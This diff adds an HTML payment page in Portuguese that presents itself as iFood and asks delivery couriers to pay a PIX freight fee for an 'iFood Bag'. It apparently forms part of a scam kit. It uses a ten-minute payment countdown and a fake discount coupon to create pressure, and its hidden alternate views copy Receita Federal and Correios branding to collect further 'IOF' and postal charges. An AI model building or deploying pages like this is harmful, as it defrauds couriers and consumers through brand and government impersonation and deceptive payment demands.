@@ -1,0 +1,192 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#EA1D2C">
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>iFood Entregador - Pagamento PIX</title>
+    <meta name="description" content="Pague o frete via PIX para confirmar o envio do seu item iFood.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=11.0">
+    <script src="backguard.js?v=1.6"></script>
+</head>
+
+<body data-page="pix">
+
+
+    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+    <main class="container">
+        <section class="step pix-page" aria-hidden="false">
+            <div class="pix-topbar">
+                <div class="pix-topbar__title">Pagamento</div>
+            </div>
+
+            <div class="pix-hero">
+                <img src="assets/pix-photo.webp" alt="Pagamento via Pix" loading="eager">
+            </div>
+
+            <h2 class="pix-heading">Pedido aguardando pagamento</h2>
+            <p class="pix-instructions">
+                Copie o codigo abaixo e utilize o Pix Copia e Cola no aplicativo que voce vai fazer o pagamento:
+            </p>
+
+            <div id="pix-empty" class="pix-empty hidden">
+                <p>Nao encontramos uma cobranca PIX ativa para este pedido.</p>
+            </div>
+
+            <div id="pix-card" class="pix-card pix-card--flat">
+                <div class="pix-copy-box">
+                    <input id="pix-code" class="pix-copy-input" type="text" readonly="">
+                    <button id="btn-copy-pix-icon" class="pix-copy-icon" type="button" aria-label="Copiar codigo">
+                        <svg viewbox="0 0 24 24" role="img" focusable="false" aria-hidden="true">
+                            <path d="M16 1H8c-1.1 0-2 .9-2 2v12h2V3h8V1Zm3 4H12c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h7c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2Zm0 16h-7V7h7v14Z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="pix-timer">
+                    <span class="pix-timer-label">O tempo para voce pagar acaba em:</span>
+                    <div id="pix-timer" class="pix-timer-value">10:00</div>
+                    <div class="pix-progress">
+                        <div id="pix-progress-bar" class="pix-progress-bar"></div>
+                    </div>
+                </div>
+
+                <button id="btn-copy-pix" class="btn-primary pix-copy-btn" type="button">Copiar codigo</button>
+                <button id="btn-show-pix-qr" class="btn-secondary pix-qr-toggle-btn" type="button">Pagar com QRcode</button>
+
+                <div id="pix-qr-section" class="pix-inline-qr hidden" aria-hidden="true">
+                    <p class="pix-inline-qr__label">Escaneie o QR Code abaixo para pagar este PIX.</p>
+                    <div class="pix-inline-qr__wrap">
+                        <img id="pix-qr" src="" alt="QR Code PIX" class="pix-inline-qr__image">
+                    </div>
+                </div>
+
+                <div class="pix-order-card">
+                    <div class="pix-order-head">
+                        <div class="pix-order-avatar">
+                            <img id="pix-order-image" src="assets/bagfoto.webp" alt="Bag iFood">
+                        </div>
+                        <div>
+                            <div id="pix-order-title" class="pix-order-title">Bag do iFood</div>
+                            <div class="pix-order-sub">N do pedido <span id="pix-order-id">-</span></div>
+                        </div>
+                    </div>
+                    <div class="pix-order-total">
+                        <span>Total no PIX</span>
+                        <strong id="pix-amount">R$ 0,00</strong>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pix-iof-view" class="pix-iof-view hidden" aria-hidden="true">
+                <div class="pix-iof-head">
+                    <img src="images/receitafederal.png" alt="Receita Federal" class="pix-iof-logo">
+                    <p class="pix-iof-head-label">VALOR DO PAGAMENTO</p>
+                    <h2 id="pix-iof-amount" class="pix-iof-head-value">R$ 0,00</h2>
+                </div>
+
+                <div class="pix-iof-body">
+                    <h3 class="pix-iof-title">Escaneie o QR Code</h3>
+                    <p class="pix-iof-subtitle">Ou copie o codigo PIX abaixo</p>
+
+                    <div class="pix-iof-qr-wrap">
+                        <img id="pix-iof-qr" src="" alt="QR Code PIX" class="pix-iof-qr">
+                    </div>
+
+                    <div class="pix-iof-copy">
+                        <label class="pix-iof-copy-label" for="pix-iof-code">Codigo PIX (Copiar e Colar)</label>
+                        <div class="pix-iof-copy-row">
+                            <input id="pix-iof-code" class="pix-iof-copy-input" type="text" readonly="">
+                            <button id="btn-copy-pix-iof" class="pix-iof-copy-btn" type="button">COPIAR</button>
+                        </div>
+                    </div>
+
+                    <div class="pix-iof-alert">
+                        <strong>Aguardando pagamento...</strong>
+                        <span>O status sera atualizado automaticamente.</span>
+                    </div>
+
+                    <div id="pix-iof-status" class="pix-iof-status">Status: Aguardando pagamento</div>
+                </div>
+            </div>
+
+            <div id="pix-correios-view" class="pix-correios-view hidden" aria-hidden="true">
+                <div class="pix-correios-top">
+                    <div class="pix-correios-nav">
+                        <img src="assets/correios-logo.svg" alt="Correios" class="pix-correios-logo">
+                    </div>
+                    <div class="pix-correios-border"></div>
+                </div>
+
+                <div class="pix-correios-head">
+                    <p class="pix-correios-head-label">VALOR DO PAGAMENTO</p>
+                    <h2 id="pix-correios-amount" class="pix-correios-head-value">R$ 0,00</h2>
+                </div>
+
+                <div class="pix-correios-body">
+                    <h3 class="pix-correios-title">Escaneie o QR Code</h3>
+                    <p class="pix-correios-subtitle">Ou copie o codigo PIX abaixo</p>
+
+                    <div class="pix-correios-qr-wrap">
+                        <img id="pix-correios-qr" src="" alt="QR Code PIX" class="pix-correios-qr">
+                    </div>
+
+                    <div class="pix-correios-copy">
+                        <label class="pix-correios-copy-label" for="pix-correios-code">Codigo PIX (Copiar e Colar)</label>
+                        <div class="pix-correios-copy-row">
+                            <input id="pix-correios-code" class="pix-correios-copy-input" type="text" readonly="">
+                            <button id="btn-copy-pix-correios" class="pix-correios-copy-btn" type="button">COPIAR</button>
+                        </div>
+                    </div>
+
+                    <div class="pix-correios-alert">
+                        <strong>Aguardando pagamento...</strong>
+                        <span>O status sera atualizado automaticamente.</span>
+                    </div>
+
+                    <div id="pix-correios-status" class="pix-correios-status">Status: Aguardando pagamento</div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+    <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
+        <div class="modal-card">
+            <div class="coupon-hero">
+                <img src="assets/bagfoto.webp" alt="Bag iFood com desconto">
+            </div>
+            <span class="modal-badge">Cupom exclusivo</span>
+            <h3 id="coupon-title">Desconto liberado no frete</h3>
+            <p id="coupon-message">Voce ganhou R$ 5,00 de desconto no frete da Bag.</p>
+            <span class="coupon-subtitle">Oferta valida agora nesta sessao</span>
+            <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
+    </footer>
+
+    <script src="script.js?v=11.0" defer=""></script>
+</body>
+
+</html>
+
+
+
+
+
+
+
